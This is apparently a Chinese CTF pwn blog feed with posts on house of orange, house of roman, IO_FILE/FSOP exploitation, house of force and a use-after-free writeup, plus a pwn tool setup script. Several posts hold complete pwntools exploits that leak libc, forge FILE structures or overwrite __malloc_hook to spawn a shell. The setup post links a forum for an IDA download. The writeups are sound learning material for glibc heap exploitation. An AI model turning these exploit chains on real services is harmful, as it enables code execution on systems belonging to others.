具体做法是，是使用upgrade功能，将name依次更新为‘aaaaaaaa’及’a’*16 然后通过see功能就可以将地址打印出来 12345678910111213141516build(0x400,'a'*8,123,1)see()p.recvuntil("a"*8)leak = u64(p.recv(6).ljust(8,'\x00'))libc_base = leak -1640- 0x3c4b20 print "libc base address --&gt;[%s]"%hex(libc_base)upgrade(0x400,'a'*16,123,1)see()p.recvuntil('a'*16)leak_heap = u64(p.recv(6).ljust(8,'\x00'))heap_base = leak_heap - 0xe0print "leak_heap --&gt;[%s]"%hex(leak_heap)print "heap_base --&gt;[%s]"%hex(heap_base)_IO_list_all = libc.symbols['_IO_list_all'] + libc_basesystem = libc.symbols['system'] + libc_base 利用unsoted bin attack将 _IO_list_all 修改为 main_arena+88 这个很容易就实现，之后再分配一个chunk时会触发malloc_printerr 1234if (__builtin_expect (chunksize_nomask (victim) &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (chunksize_nomask (victim) &gt; av-&gt;system_mem, 0)) malloc_printerr ("malloc(): memory corruption"); 触发malloc_printerr后会调用一系列函数，最终调用 _IO_overflow函数 1234函数大致调用链malloc_printerr -&gt; __libc_message -&gt; __GI_abort -&gt; _IO_flush_all_lockp -&gt; _IO_OVERFLOW而_IO_OVERFLOW最后会调用vtable表中的__overflow 函数#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH) _IO_flush_all_lockp 源码： 123456789101112131415161718192021222324252627282930_IO_flush_all_lockp (int do_lock)&#123; int result = 0; FILE *fp;#ifdef _IO_MTSAFE_IO _IO_cleanup_region_start_noarg (flush_cleanup); _IO_lock_lock (list_all_lock);#endif for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp-&gt;_chain) &#123; run_fp = fp; if (do_lock) _IO_flockfile (fp); if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)/*一些检查，需要绕过*/ || (_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base))/*也可以绕过这个*/ ) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)/*遍历_IO_list_all ，选出_IO_FILE作为_IO_OVERFLOW的参数，执行函数*/ result = EOF; if (do_lock) _IO_funlockfile (fp); run_fp = NULL; &#125;#ifdef _IO_MTSAFE_IO _IO_lock_unlock (list_all_lock); _IO_cleanup_region_end (0);#endif return result;&#125; 所以这里通过将_IO_list_all修改为main_arena+0x58,这时IO_list_all中的 *chain指针位于 _IO_list_all + 0x68的位置，也就是 main_arena + 0x58 + 0x68–&gt;small bin中大小为0x60的位置，所以将之前old top chunk的size修改为0x60，old top chunk就会链入small bin中，这时就可以将伪造的fake_file链入IO_all_list中,将fake_file的vtable指向伪造的IO_jump_t结构的地址，在伪造的 IO_jump_t 结构体中，在overflow函数处写入system函数，则最终会调用system函数 伪造的file结构体要通过的条件 12345671.((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) 或者是2._IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base) 一般来说上面比较好伪造，我下面的exp也是伪造的上面的 如果伪造下面的话还要关注一下_wide_data结构体，这里就略过了 查看是否为伪造成功 此时的vtable已经指向伪造的函数表了 exp： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980from pwn import*context.log_level = 'debug'p = process('./houseoforange')elf = ELF('./houseoforange')libc = elf.libcdef menu(idx): p.recvuntil(': ') p.sendline(str(idx))def see(): menu(2)def build(length, nm, pz, color): menu(1) p.recvuntil(":") p.sendline(str(length)) p.recvuntil(":") p.send(nm) p.recvuntil(":") p.sendline(str(pz)) p.recvuntil(":") p.sendline(str(color))def upgrade(length, nm, pz, color): menu(3) p.recvuntil(":") p.sendline(str(length)) p.recvuntil(":") p.send(nm) p.recvuntil(":") p.sendline(str(pz)) p.recvuntil(":") p.sendline(str(color))build(0x30,'a'*8,123,1)#gdb.attach(p)payload = 'a'*0x30 + p64(0) + p64(0x21) +'a'*16+ p64(0)+ p64(0xf80)upgrade(len(payload),payload,123,2)build(0x1000,'b',123,1)log.info('-----------------------leak address-------------------------')build(0x400,'a'*8,123,1)see()p.recvuntil("a"*8)leak = u64(p.recv(6).ljust(8,'\x00'))libc_base = leak -1640- 0x3c4b20 print "libc base address --&gt;[%s]"%hex(libc_base)upgrade(0x400,'a'*16,123,1)see()p.recvuntil('a'*16)leak_heap = u64(p.recv(6).ljust(8,'\x00'))heap_base = leak_heap - 0xe0print "leak_heap --&gt;[%s]"%hex(leak_heap)print "heap_base --&gt;[%s]"%hex(heap_base)_IO_list_all = libc.symbols['_IO_list_all'] + libc_basesystem = libc.symbols['system'] + libc_baselog.info('-------------------------unsorted bin and build fake file--------------------------')payload = 'a'*0x400payload += p64(0) + p64(0x21) + 'a'*0x10fake_file = '/bin/sh\x00' + p64(0x60) #这里写入binsh字符串是因为最后调用vtable中的函数时会将IO_FILE的指针作为参数fake_file += p64(0) + p64(_IO_list_all - 0x10)#unsorted bin attackfake_file += p64(0) + p64(1) #bypass check fake_file = fake_file.ljust(0xc0,'\x00')payload += fake_filepayload += p64(0)*3payload += p64(heap_base + 0x5e8)#vtablepayload += p64(0)*2payload += p64(system)upgrade(0x800,payload,123,1)p.recv()p.sendline('1')p.interactive()]]></content>
      <categories>
        <category>Heap_Exploitation</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>houseofxxx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[house_of_roman]]></title>
    <url>%2F2018%2F09%2F18%2F2018-9-18-house_of_roman%2F</url>
    <content type="text"><![CDATA[记录一下，防止以后忘了 house_of_roman：该技术用于 bypass ALSR，利用12-bit 的爆破来达到获取shell的目的。且仅仅只需要一个 UAF 漏洞以及能创建任意大小的 chunk 的情况下就能完成利用 house_of_roman的作者提供了一个demo作为展示利用大概分三个步骤： 将 FD 指向 malloc_hook 修正 0x71 的 Freelist 往 malloc_hook 写入 one gadget 先分析下程序：程序开启了PIE和NX，一共有3个功能 程序存在UAF漏洞和堆溢出漏洞 堆溢出： UAF： 程序的大致情况了解了后，分析作者的利用过程我将作者的利用过程又细分了下 先分配3个chunk(0,1,2),大小分别为0x20,0xd0,0x70 用write_chunk功能在chunk2 + 0x68上设置fakesize 为0x61，用于后面的fastbins attack 将chunk1 free 掉后再分配，使得chunk1中包含main_arean+0x88的指针 然后分配3个大小为0x70的chunk(3,4,5),为后面做准备 通过堆溢出漏洞，将chunk1的size字段伪造为0x71，然后将chunk2,chunk3 free掉，通过UAF漏洞，将chunk3的fd指针最低位修改成0x20，将chunk1加入fastbins list中 将chunk1的fd修改成 malloc_hook-0x23,之所以修改成malloc_hook-0x23 ，是为了后面的fastbin dup， __malloc_hook - 0x23 + 0x8的地址上的值为0x7f 连续分配3个大小为0x70的chunk，就可以获得包含__malloc_hook的chunk，将这个chunk指针赋给chunk0 free掉chunk4,通过uaf，将chunk4的FD修改为0，修复fastbins list 利用unsorted bins attack 向__malloc_hook写入main_arena+0x88 通过编辑功能，将__malloc_hook的低三个字节修改成one_gadget的偏移 最后连续free chunk5两次，通过malloc_printerr来出发malloc，getshell 为了方便调试，我关掉了aslr 设置fake_size123fake = "A"*0x68fake += p64(0x61) ## fake sizeedit(1,fake) free chunk1，使其包含main_arena+0x88的地址 *分配3个大小为0x70的chunk,修改chunk1的size字段为0x711234567create(0x65,3) # chunk3 0x555555757170create(0x65,15) # chunk4 0x5555557571e0create(0x65,18) # chunk5 0x555555757250over = "A"*0x18 # off by oneover += "\x71" # set chunk 1's size --&gt; 0x71edit(0,over) free掉chunk2，chunk3，通过uaf将chunk3的fd最低为修改为’\x20’，将chunk1加入fastbins list中1234delete(2)delete(3)heap_po = "\x20"edit(3,heap_po) 利用write功能，将chunk1的fd指针最低两位修改成’\xed\x1a’,即将fd修改为malloc_hook - 0x23，这是为了利用fastbins dup 获得包含malloc_hook的chunk， 原因上面说了，因为__malloc_hook - 0x23 +0x8地址的值为0x7f，可以绕过检测12malloc_hook_nearly = "\xed\x1a" #__malloc_hook - 0x23 edit(1,malloc_hook_nearly) 连续分配三次大小为0x70的chunk，就可以获得包含__malloc_hook的chunk了 利用 unsorted bin attack 向malloc_hook中写入main_arena+0x88，使malloc_hook中包含libc的地址12345678910create(0xc8,1)create(0xc8,1)create(0x18,2)create(0xc8,3)create(0xc8,4)delete(1)po = "B"*8po += "\x00\x1b" # 这个是__memalign_hook的最低两位，为了将bk修改为__malloc_hook - 0x10edit(1,po)create(0xc8,1) 通过修改chunk0，将__malloc_hook的低三位修改为one_gadget123over = &quot;R&quot;*0x13 # padding for malloc_hookover += &quot;\xa4\xd2\xaf&quot;edit(0,over) 此时 malloc_hook附近的内容为下图，padding的计算是分配包含malloc_hook的chunk的地址 减去 __malloc_hook的地址 最后通过连续free同一块chunk，通过malloc_printerr 来触发malloc getshell exp:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889from pwn import*#context.log_level = 'debug'p = process('./new_chall')def create(size,idx): p.recv() p.sendline('1') p.recv() p.sendline(str(size)) p.recv() p.sendline(str(idx))def edit(idx,content): p.recv() p.sendline('2') p.recv() p.sendline(str(idx)) p.recv() p.send(content)def delete(idx): p.recv() p.sendline('3') p.recv() p.sendline(str(idx))p.recvuntil(":")p.sendline("zs0zrc")create(0x18,0) # chunk0 0x20create(0xc8,1) # chunk1 d0 0x555555757030 create(0x65,2) # chunk2 0x70 0x555555757100fake = "A"*0x68fake += p64(0x61) ## fake sizeedit(1,fake)log.info('edit chunk 1 to fake')delete(1)create(0xc8,1)create(0x65,3) # chunk3 0x555555757170create(0x65,15) # chunk4 0x5555557571e0create(0x65,18) # chunk5 0x555555757250over = "A"*0x18 # off by oneover += "\x71" # set chunk 1's size --&gt; 0x71edit(0,over)log.info('set chunk 1 size --&gt; 0x71')delete(2)delete(3)heap_po = "\x20"edit(3,heap_po)log.info('ADD b to fastbins list')# malloc_hook--&gt;[0x7ffff7dd1b10]malloc_hook_nearly = "\xed\x1a" #__malloc_hook - 0x23 edit(1,malloc_hook_nearly)log.info("change B fd ")create(0x65,0)create(0x65,0)create(0x65,0) #malloc a chunk include malloc_hookdelete(15)edit(15,p64(0))#fix fastbins listlog.info('fix fastbins list')create(0xc8,1)create(0xc8,1)create(0x18,2)create(0xc8,3)create(0xc8,4)delete(1)po = "B"*8po += "\x00\x1b"edit(1,po)create(0xc8,1)log.info('use unsortbins attack change malloc_hook to main_arena + 0x88')over = "R"*0x13 # padding for malloc_hookover += "\xa4\xd2\xaf"edit(0,over)delete(18)delete(18)p.interactive()]]></content>
      <categories>
        <category>Heap_Exploitation</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>houseofxxx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IO_FILE的利用总结]]></title>
    <url>%2F2018%2F09%2F17%2F2018-9-17-IO_FILE%E7%9A%84%E4%B8%80%E4%BA%9B%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[fclose 劫持fp指针,伪造_IO_FILE_plus结构 伪造IO_FILE_plus结构体, 32位和64位不一样，32位的需要伪造vtable,而64位可以不用伪造vtable，因为64位的在绕过几个函数后会获得一次call [rax + 0x10]的机会 先说32bits的 调用 IO_FINISH(fp)的情况 123456789101112#注意flags字段，只需要_flags &amp; 0x2000为0就会直接调用 IO_FINSH(fp)，IO_FINISH(fp)相当于调用fp-&gt;vtabl-&gt;__finish(fp)#其中shell是后门函数fake_file = "\x00" * 0x48 + p32(buf_add)fake_file = fake_file.ljust(0x94, "\x00")fake_file += p32(buf_add + 0x98 - 0x8)#fake_vtable_addr = buf_addr + 0x98 - 0x8fake_file += p32(shell)#不存在后门函数的情况fake_file = "\x00" * 4 + ";sh" fake_file = fake_file.ljust(0x48,'\x00')+ p32(buf_add)fake_file = fake_file.ljust(0x94, "\x00")fake_file += p32(buf_add + 0x98 - 0x8)#fake_vtable_addr = buf_addr + 0x98 - 0x8fake_file += p32(system) 调用__fclose()函数的情况: flags &amp; 0x2000不为0 1234567#_flags &amp; 0x2000不为0最终会调用fp-&gt;vtabl-&gt;__fclose(fp)fake_file = "/bin/sh\x00"fake_file = fake_file.ljust(0x48,'\x00')fake_file += p32(fake_lock_addr) # 指向一处值为0的地址fake_file = fake_file.ljust(0x94, "\x00")fake_file += p32(fake_vtable)#fake vtable address = buf_addr + 0x98 - 0x44fake_file += p32(system) 64bits的情况： 程序中存在后门函数 12fake_file ='\0'*0x10 + p64(get_shell)+'\0'*0x70+ p64(buf_addr)fake_file = fake_file.ljust(0xd8,'\0')+p64(buf_addr) 程序中不存在后门函数 123456fake_file = "/bin/sh\x00" + '\x00' * 0x8fake_file += p64(system) + '\x00' * 0x70# the system can also be placed in other memoryfake_file += p64(fake_lock_addr)#指向一处值为0的地址fake_file = fake_file.ljust(0xd8, '\x00')fake_file += p64(buf_addr + 0x10 - 0x88) # fake_vtable_addr fclose源码学习文章：blog 等过段时间有时间了在去分析下fclose源码 例子 ： xman 的example1 可以编译成32位和64位来练练手 ，pwnable.tw的seethefile 劫持 stdout文件流指针 通过任意地址写漏洞，将stdout的指针指向伪造的_IO_FILE_plus结构,其中vtable指向伪造的 vtable函数表 这里拿 网鼎杯的那道blind做例子 原本的stdout结构体 1234567891011121314151617181920212223242526272829303132333435gef➤ p *(struct _IO_FILE_plus *) stdout$2 = &#123; file = &#123; _flags = 0xfbad2887, _IO_read_ptr = 0x7f5b6742a6a3 &lt;_IO_2_1_stdout_+131&gt; "\n", _IO_read_end = 0x7f5b6742a6a3 &lt;_IO_2_1_stdout_+131&gt; "\n", _IO_read_base = 0x7f5b6742a6a3 &lt;_IO_2_1_stdout_+131&gt; "\n", _IO_write_base = 0x7f5b6742a6a3 &lt;_IO_2_1_stdout_+131&gt; "\n", _IO_write_ptr = 0x7f5b6742a6a3 &lt;_IO_2_1_stdout_+131&gt; "\n", _IO_write_end = 0x7f5b6742a6a3 &lt;_IO_2_1_stdout_+131&gt; "\n", _IO_buf_base = 0x7f5b6742a6a3 &lt;_IO_2_1_stdout_+131&gt; "\n", _IO_buf_end = 0x7f5b6742a6a4 &lt;_IO_2_1_stdout_+132&gt; "", _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x7f5b674298e0 &lt;_IO_2_1_stdin_&gt;, _fileno = 0x1, _flags2 = 0x0, _old_offset = 0xffffffffffffffff, _cur_column = 0x0, _vtable_offset = 0x0, _shortbuf = "\n", _lock = 0x7f5b6742b780 &lt;_IO_stdfile_1_lock&gt;, _offset = 0xffffffffffffffff, _codecvt = 0x0, _wide_data = 0x7f5b674297a0 &lt;_IO_wide_data_1&gt;, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0x0, _mode = 0xffffffff, _unused2 = '\000' &lt;repeats 19 times&gt; &#125;, vtable = 0x7f5b674286e0 &lt;_IO_file_jumps&gt;&#125; 伪造的IO_FILE_plus结构体中的flags要满足下面的条件 12flag&amp;8 = 0 and flag &amp;2 =0 and flag &amp; 0x8000 != 0所以flag的值可以为0xfbad8000 或者0xfbad8080 其他的根据原本的结构体伪造就行了 123456fake_struct = p64(0x00000000fbad8000) + p64(0x602060)*7 + p64(0x602061) + p64(0)*4 fake_struct += p64(0x602060) + p64(0x1) + p64(0xffffffffffffffff)+ p64(0) fake_struct += p64(0x602060) + p64(0xffffffffffffffff) + p64(0) + p64(0x602060) fake_struct += p64(0)*3 + p64(0x00000000ffffffff) + p64(0) fake_struct += p64(0)+ p64(0x602090 + 0x68*3)fake_vtable = p64(system_addr)*10 + '\n' 伪造后的结构体: 1234567891011121314151617181920212223242526272829303132333435gef➤ p *(struct _IO_FILE_plus *)0x602090$1 = &#123; file = &#123; _flags = 0xfbad8000, _IO_read_ptr = 0x602060 " `", _IO_read_end = 0x602060 " `", _IO_read_base = 0x602060 " `", _IO_write_base = 0x602060 " `", _IO_write_ptr = 0x602060 " `", _IO_write_end = 0x602060 " `", _IO_buf_base = 0x602060 " `", _IO_buf_end = 0x602061 " `", _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x602060, _fileno = 0x1, _flags2 = 0x0, _old_offset = 0xffffffffffffffff, _cur_column = 0x0, _vtable_offset = 0x0, _shortbuf = "", _lock = 0x602060, _offset = 0xffffffffffffffff, _codecvt = 0x0, _wide_data = 0x602060, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0x0, _mode = 0xffffffff, _unused2 = '\000' &lt;repeats 19 times&gt; &#125;, vtable = 0x6021c8&#125; FSOP 这个技术的核心就是劫持_IO_list_all的值来伪造链表和其中的_IO_FILE项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP选择的触发方法是调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all链表中所有项的文件流，相当于对每个FILE调用fflush，也对应着会调用_IO_FILE_plus.vtable中的IO_overflow函数。 libc版本小于2.24 IO_flush_all_lockp函数源码 123456789101112131415161718192021222324252627282930_IO_flush_all_lockp (int do_lock)&#123; int result = 0; FILE *fp;#ifdef _IO_MTSAFE_IO _IO_cleanup_region_start_noarg (flush_cleanup); _IO_lock_lock (list_all_lock);#endif for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp-&gt;_chain) &#123; run_fp = fp; if (do_lock) _IO_flockfile (fp); if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)/*一些检查，需要绕过*/ || (_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base))/*也可以绕过这个*/ ) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)/*遍历_IO_list_all ，选出_IO_FILE作为_IO_OVERFLOW的参数，执行函数*/ result = EOF; if (do_lock) _IO_funlockfile (fp); run_fp = NULL; &#125;#ifdef _IO_MTSAFE_IO _IO_lock_unlock (list_all_lock); _IO_cleanup_region_end (0);#endif return result;&#125; IO_flush_all_lockp函数触发条件： 当libc执行abort流程时 abort可以通过触发malloc_printerr来触发 当执行exit函数时 当执行流从main函数返回时 FSOP攻击的前提条件： 泄露出libc地址，知道 _IO_lsit_all的地址 任意地址写的能力，修改 _IO_list_all为可控的地址 可以在可控内存中伪造_IO_FILE_plus结构 _IO_list_all 结构： 1234567891011121314151617181920212223242526272829303132333435pwndbg&gt; p *_IO_list_all$1 = &#123; file = &#123; _flags = 0xfbad2086, _IO_read_ptr = 0x0, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x0, _IO_write_ptr = 0x0, _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x7ffff7dd2620 &lt;_IO_2_1_stdout_&gt;, #这里是我们需要控制的地方，将伪造的_IO_FILE_plus结构链入 _IO_FILE的链表头部 _fileno = 0x2, _flags2 = 0x0, _old_offset = 0xffffffffffffffff, _cur_column = 0x0, _vtable_offset = 0x0, _shortbuf = "", _lock = 0x7ffff7dd3770 &lt;_IO_stdfile_2_lock&gt;, _offset = 0xffffffffffffffff, _codecvt = 0x0, _wide_data = 0x7ffff7dd1660 &lt;_IO_wide_data_2&gt;, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0x0, _mode = 0x0, _unused2 = '\000' &lt;repeats 19 times&gt; &#125;, vtable = 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;&#125; 伪造的_IO_FILE_plus结构体要绕过的check 12345671.((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) 或者是2._IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base) 一般来说都是伪造前者，因为简单点 具体利用 可以去看 house of orange这道题 新版本libc下的IO_FILE的利用 通过控制 stdin/stdout文件流 内部的_IO_buf_base和 _IO_buf_end来达到任意地址读写的目的 因为进程中包含了系统默认的三个文件流stdin\stdout\stderr，因此这种方式可以不需要进程中存在文件操作，通过scanf\printf一样可以进行利用 _IO_FILE结构 1234567891011121314151617181920212223242526272829struct _IO_FILE&#123; int _flags; /*flag标志位，用于一些检查 */ /* The following pointers correspond to the C++ streambuf protocol. */ char *_IO_read_ptr; /* Current read pointer */ char *_IO_read_end; /* End of get area. */ char *_IO_read_base; /* Start of putback+get area. */ char *_IO_write_base; /* Start of put area. */ char *_IO_write_ptr; /* Current put pointer. */ char *_IO_write_end; /* End of put area. */ char *_IO_buf_base; /* 操作的起始地址. */ char *_IO_buf_end; /* 操作的结束地址. */ /*控制 _IO_buf_base 和 _IO_buf_end就可以实现任意读写*/ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; /* 用于形成_IO_FILE 链表 int _fileno; int _flags2; __off_t _old_offset; /* This used to be _offset but it's too small. */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE&#125;; 任意地址读的例子 from Angelboy大佬 任意地址写的例子 from Angelboy大佬]]></content>
      <categories>
        <category>IO_FILE利用</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwn环境]]></title>
    <url>%2F2018%2F09%2F16%2F2018-9-16-pwnenv%2F</url>
    <content type="text"><![CDATA[记录一下我的pwn环境，为以后虚拟机玩坏了要重装做准备先装一手虚拟机，下好ubuntu16.0.4版本的镜像装好镜像地址：https://pan.baidu.com/s/1mhCxGKg 密码：skyf 虚拟机装好后就开始装下面这些东西 32位依赖库 gdb的插件 peda 用来调试堆的插件Pwndbg ROPgadget 做题的工具，用来找gadget的 pwntools 是一个ctf框架和漏洞利用开发库，用python开发的 LibcSearcher用来泄露libc库中函数的偏移的库 one_gadget用来寻找libc库中的execve(‘/bin/sh’, NULL, NULL)可以一个gadget就可以getshell的好东西 安装32位程序运行依赖环境：12dpkg --add-architecture i386sudo apt-get -y install lib32z1 lib32ncurses5 安装peda：12git clone https://github.com/longld/peda.git ~/pedaecho &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit 安装Pwndbg:123cd ~/git clone https://github.com/scwuaptx/Pwngdb.git cp ~/Pwngdb/.gdbinit ~/ ROPgadget:123456先安装Capstone Capstone是一个轻量级的多平台架构支持的反汇编架构，支持包括ARM\ARM64、MIPC和x64/x86平台。sudo apt-get install python-capstone然后，下载好ROPgadget解压进入文件夹中python setup.py install$ ROPgadget pwntools安装 :1234567最新版的pwntools会报错 在安装完后再加一条 sudo pip install pyelftools==0.24 就可以了sudo apt-get updatesudo apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essentialsudo pip install --upgrade pipsudo pip install --upgrade pwntools#可能安装时会遇到很多奇奇怪怪的问题，上网查基本上都可以查得到，要学会科学上网 LibcSearcher安装：1234git clone https://github.com/lieanu/libc.gitcd libcgit submodule update --init --recursivesudo python setup.py develop one_gadget安装：1234先安装gemsudo apt install ruby然后gem install one_gadget 然后还要在windows上装好IDA，这是一款很强大的静态反编译软件(F5大法好，了解一下)可以在52pojie上下，下面贴上网址https://www.52pojie.cn/thread-675251-1-1.html 还有半自动化脚本 1234567891011121314151617181920212223242526272829303132333435363738#!/bin/bashcd ~/# change soursesudo sed -i 's/# deb-src/deb-src/' "/etc/apt/sources.list"# support 32 bitdpkg --add-architecture i386sudo apt-get updatesudo apt-get -y install lib32z1 lib32ncurses5# download the libc source to current directorysudo apt-get source libc6-dev#install vimsudo apt install vim#install gitsudo apt-get -y install git# install pedagit clone https://github.com/longld/peda.git ~/pedaecho "source ~/peda/peda.py" &gt;&gt; ~/.gdbinit# install pwndbggit clone https://github.com/pwndbg/pwndbgcd pwndbgsudo ./setup.sh#install gem and one_gadgetsudo apt install rubysudo gem install one_gadget# install pwntoolssudo apt-get -y install python python-pipsudo apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essentialsudo pip install --upgrade pipsudo pip install pwntoolssudo pip install pyelftools==0.24echo "ok have fun with pwn!!"]]></content>
      <categories>
        <category>TOOL</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[top_chunk的玩法]]></title>
    <url>%2F2018%2F09%2F15%2F2018-9-15-topchunk%E7%9A%84%E4%B8%80%E4%BA%9B%E7%8E%A9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[house_of_force是一种通过修改topchunk 的size字段来控制malloc返回包含想要控制地址的chunk的手法，从而达到修改任意地址内容的目的 原理：123456假设有一个溢出漏洞，可以改写 top chunk 的size字段，然后将其改为一个非常大的值，以确保所有的 malloc 将使用 top chunk 分配，而不会调用 mmap。这时如果攻击者 malloc 一个很大的数目（负有符号整数），top chunk 的位置加上这个大数，造成整数溢出，结果是 top chunk 能够被转移到堆之前的内存地址（如程序的 .bss 段、.data 段、GOT 表等），下次再执行 malloc 时，攻击者就能够控制转移之后地址处的内存。 house_of_force利用条件： 存在漏洞能控制top_chunk的size大小 能自由控制分配堆的大小 分配的次数不受限制 evil chunk的大小：用目标地址减去 top chunk 地址，再减去 chunk 头的大小。 利用方法： 通过漏洞控制top chunk 的size字段为-1 (32位的话就是0xffffffff,64位的话就是0xffffffffffffffff) 计算出要分配的evil chunk的大小 分配evil chunk 分配目标地址的chunk 同时top_chunk还有另一种玩法假设存在堆溢出漏洞或者其他能修改top chunk size字段的漏洞，加上malloc的大小受用户输入控制 将top chunk size 字段修改为 __free_hook + system - top_chunk _ptr -1 在malloc 一个 _free_hook - top_chunk_ptr - 0x10大小的chunk就可以将__free_hook 地址的内容修改为 top chunk的新size 即 system函数的地址 具体分析下源码： 从topchunk中分配chunk的操作12345678910111213p = av-&gt;top;size = chunksize (p);/* check that one of the above allocation paths succeeded */if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) &#123; remainder_size = size - nb; remainder = chunk_at_offset (p, nb); av-&gt;top = remainder; set_head (p, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); check_malloced_chunk (av, p, nb); return chunk2mem (p); &#125; 如果将top chunk的size字段修改为(system + free_hook - top_chunk_ptr )当分配 free_hook - top_chunk_ptr -0x10时，就会从top chunk 中分配分配完后 ，新topchunk 的size 为1new_size= (system + __free_hook - top_chunk_ptr) - (__free_hook - top_chunk_ptr - 0x10 + 0x10) = system 然后新的top_chunk_ptr 为 old_top_ptr + 分配掉的size1new_top_chunk_ptr = top_ptr + ( __free_hook - top_chunk_ptr -0x10) = __free_hook - 0x10 理论上是这样的，但是实际分配的时候还需要考虑到计算size的对齐问题等，所以可以在上面写入的值附近试一试，保证最后可以在__free_hook写入system地址（实际上是system+1，因为topchunk的P标志位会被设为1）地址就行。]]></content>
      <categories>
        <category>Heap_Exploitation</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>houseofxxx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[raas writeup]]></title>
    <url>%2F2018%2F05%2F11%2F2018-5-11-raas-writeup%2F</url>
    <content type="text"><![CDATA[hint:This is a Record-as-a-Service!And also our fist heap-based challenge.Tips: use after free同时题目给了源码很明显这是一个UAF漏洞的利用 防护机制： 题目的数据结构：12345678struct record &#123; void (*print)(struct record *); void (*free)(struct record *); union &#123; int integer; char *string; &#125;;&#125;; 题目用来free的函数123456789101112131415161718void rec_int_free(struct record *rec)&#123; free(rec); puts("Record freed!");&#125;void rec_str_free(struct record *rec)&#123; free(rec-&gt;string); free(rec); puts("Record freed!");&#125;void do_dump()&#123; int idx = ask("Index"); records[idx]-&gt;print(records[idx]);&#125; 因为它free后没有将堆块中的指针清零，同时也没将数组的内容清空，所以这里存在UAF漏洞，这堆块在free掉后还可以使用 生成两个int的record,查看下堆的情况12createint(0,&quot;123&quot;) /*假设分配的堆块为p1*/createint(1,&quot;123&quot;) /*假设分配的堆块为p2*/ 画个直观图就是下面这样： 将这两个record free掉后，堆的情况 可以看见int类型的record的大小为0x10，chunk_size后面存放了free函数的指针和print函数的指针它们free掉后，根据它们的大小，它们被分到fastbin，根据fastbin的分配规则，后free的chunk块会被先分配。如果这个时候create一个字符型的record[2]，控制字符串大小小于16，那么会将p2分配给record[2]，将p1分配给字符串。1createstr(2,12,&quot;aaaabbbb&quot;) 堆的情况： 可以看到此时p1上的指针已经被”aaaabbbb”给覆盖了 如果将p1的free函数的指针覆盖成system函数，字符串以”sh\x00\x00”开头，再调用do_delete(0),就可以控制程序执行system函数，最终获取shell 解题思路： 先create 两个int的record,然后delete掉它们 然后生成一个字符型的record,字符串的大小为12，以”sh\x00\x00”开头 调用do_delete(0) exp:12345678910111213141516171819202122232425262728293031323334353637383940414243444546#!/usr/bin/env python# 